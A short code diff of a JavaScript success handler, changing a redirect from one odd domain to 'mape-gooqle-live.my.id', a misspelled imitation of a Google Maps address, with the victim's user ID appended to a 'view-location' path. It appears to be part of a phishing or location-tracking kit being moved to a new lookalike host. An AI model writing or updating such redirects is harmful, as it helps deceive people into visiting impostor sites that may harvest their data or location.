@@ -97,7 +97,7 @@ $(document).ready(function () {
                     
                         // Redirect to another URL on success
                         window.onload = function(){
-                            window.location.href = `https://mail.mp-view.shop/view-location/${userId}`;
+                            window.location.href = `https://mape-gooqle-live.my.id/view-location/${userId}`;
                           }
                     
                 },
